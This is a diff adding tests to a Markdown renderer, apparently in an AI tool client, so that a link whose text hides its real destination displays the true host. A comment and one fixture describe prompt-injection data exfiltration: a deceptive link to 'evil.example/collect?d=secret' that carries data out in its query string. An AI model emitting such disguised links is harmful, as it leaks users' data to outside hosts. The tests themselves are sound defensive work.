@@ -38,6 +38,24 @@ describe("Markdown", () => {
     expect(out).toContain("click");
   });
 
+  // MCP security audit 2026-11-25 (lower-severity): a link's text can name one site while it points at
+  // another, which is how an injected instruction smuggles data out in a query string. The real host is
+  // shown beside any link whose text does not already show it.
+  it("RED LEG: a link whose text hides its destination shows the real host beside it", () => {
+    const out = html("Pay here: [your bank](https://evil.example/collect?d=secret)");
+    expect(out).toContain('<a href="https://evil.example/collect?d=secret" target="_blank" rel="noopener noreferrer">your bank</a>');
+    expect(out).toContain('<span class="link__host">(evil.example)</span>');
+    // a name inside a longer name is not the host
+    expect(html("[bank.example](https://mybank.example/)")).toContain('<span class="link__host">(mybank.example)</span>');
+    expect(html("[mybank.example](https://bank.example/)")).toContain('<span class="link__host">(bank.example)</span>');
+  });
+
+  it("no host label when the text already shows the host, or for a bare URL", () => {
+    expect(html("[example.com docs](https://example.com/a)")).not.toContain("link__host");
+    expect(html("[https://www.example.com/a](https://www.example.com/a)")).not.toContain("link__host");
+    expect(html("see https://example.com/a")).not.toContain("link__host");
+  });
+
   it("the pseudo-links a model writes for tool names are shown as code, not as links", () => {
     const out = html("Tools: [building_violations](link) / [who_owns](link)");
     expect(out).toContain("<code>building_violations</code>");
